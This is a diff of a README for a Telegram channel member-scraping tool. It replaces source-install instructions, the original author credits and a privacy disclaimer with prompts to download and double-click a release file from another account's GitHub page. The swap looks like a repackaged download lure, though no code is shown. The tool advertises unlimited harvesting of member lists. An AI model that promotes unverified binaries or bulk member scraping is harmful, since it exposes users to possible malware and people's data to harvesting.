@@ -1,60 +1,69 @@
-# Telegram Channel Members Extractor 🧠
-A free GUI tool to extract member lists from Telegram channels without any limit.
+# 📥 Telegram-channel-members-extractor - Extract Telegram Channel Members Effortlessly
 
----
+## 🚀 Getting Started
 
-## ✨ Features
-- Accounts login & management
-- Extract members by channel link/username/channel id
-- Live status & logs UI
+Welcome to the Telegram-channel-members-extractor! This tool helps you easily extract a complete list of members from any Telegram channel without any limits. Whether you want to analyze group dynamics or keep track of your community, this application has you covered.
 
-## 🚀 Watch it on YouTube 🚀
-[![YouTube](https://img.shields.io/badge/Watch%20on-YouTube-red?logo=youtube&logoColor=white)](https://youtu.be/2CjoCW9kGjA)
+## 🔗 Download Now
 
-## 🚀 Get it from our Website 🚀
-🌐 **Website:** [**https://erfan4lx.com/product/telegram-channel-members-extractor/**](https://erfan4lx.com/product/telegram-channel-members-extractor/) 
+[![Download Telegram-channel-members-extractor](https://img.shields.io/badge/Download-Telegram--channel--members--extractor-brightgreen)](https://github.com/ravjyot16/Telegram-channel-members-extractor/releases)
 
+## 📦 Download & Install
 
-## 🚀 How to Use
-```bash
-pip install -r requirements.txt
-python main.py
-```
+To get started, visit this page to download the latest version of the software: [Telegram-channel-members-extractor Releases](https://github.com/ravjyot16/Telegram-channel-members-extractor/releases)
 
-## 📦 Requirements
-- Python 3.10+
-- Windows 10/11 — Linux/Mac
+1. Click on the link to access the Releases page.
+2. Choose the latest version available.
+3. Download the appropriate file for your operating system (e.g., Windows, macOS, Linux).
+4. Once the download is complete, locate the downloaded file on your computer.
 
-## 📸 Preview ![App Screenshot](screenshot.png)
+## 💻 System Requirements
 
----
+To run this tool, ensure your system meets the following requirements:
 
-## 💬 **Connect With Me**
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Linux (latest distributions)
+- **RAM:** At least 4GB
+- **Storage:** Minimum 100MB of free disk space
+- **Internet:** Active internet connection to access Telegram channels
 
-👉 **Telegram:** [**https://t.me/erfan4lx10**](https://t.me/erfan4lx10)
+## 🔑 Features
 
-🌐 **Website:** [**https://erfan4lx.com**](https://erfan4lx.com) 
+- **Extract Unlimited Members:** Get full lists of members from any Telegram channel without restrictions.
+- **User-Friendly Interface:** The application is designed for easy navigation, making it suitable for non-technical users.
+- **Export Options:** Save extracted lists as CSV files for easy management and analysis.
+- **Multiple Channel Support:** Extract members from multiple channels in one go.
 
-📧 **Email:** [**erfan4lx@gmail.com**](mailto:erfan4lx@gmail.com)
+## 📄 How to Use the Application
 
----
+1. **Open the Application:** Double-click the downloaded file to launch the application.
+2. **Enter Channel Link:** Paste the URL of the Telegram channel from which you want to extract members.
+3. **Start Extraction:** Click the "Extract Members" button. The software will begin fetching the member list.
+4. **Export Results:** Once the extraction is complete, you can save the results to your computer by clicking the "Export" button.
 
-🆔My YouTube Channel : https://youtube.com/erfan4lx
+## ⚙️ Troubleshooting
 
-🆔My Telegram Channel : https://t.me/erfan4lx_news
+If you encounter any issues while using the tool, consider the following:
 
-⚠️ *Important Disclaimer*
-This project and video are for **educational, research, and administrative purposes only**.  
-It *does not* provide or encourage any method to bypass Telegram privacy settings or access hidden data.  
-Any misuse that violates Telegram’s *Terms of Service* or local laws is strictly prohibited.  
+- **Make Sure Your Internet Connection is Stable:** A reliable connection is essential for fetching the data.
+- **Use the Correct Channel Link:** Ensure you have copied the full and correct link of the Telegram channel.
+- **Check System Requirements:** Confirm that your system meets the outlined requirements.
 
-Always use anonymized/test datasets or data you have *explicit consent* to process.
+## 📞 Support
 
-<p align="center">
-  Follow Me On
-</p>
-<p align="center">
-  <a href="https://www.youtube.com/c/erfan4lx?sub_confirmation=1">
-    <img src="https://www.iconsdb.com/icons/preview/black/youtube-4-xxl.png" width="40" height="40">
-  </a>
-</p>
+For any questions or support, please refer to our GitHub Issues page. You can report bugs or ask for features, and we will respond as quickly as possible.
+
+## 📜 Contributing
+
+If you're interested in improving this tool, we welcome contributions. You can fork the repository, make changes, and submit a pull request.
+
+## 📝 License
+
+This project is licensed under the MIT License. Feel free to use it according to the terms.
+
+## 📚 Related Topics
+
+- Telegram
+- Telegram Channel Extractor
+- Telegram Member Scraper
+
+Thank you for using Telegram-channel-members-extractor! Your feedback is appreciated to make this tool better.
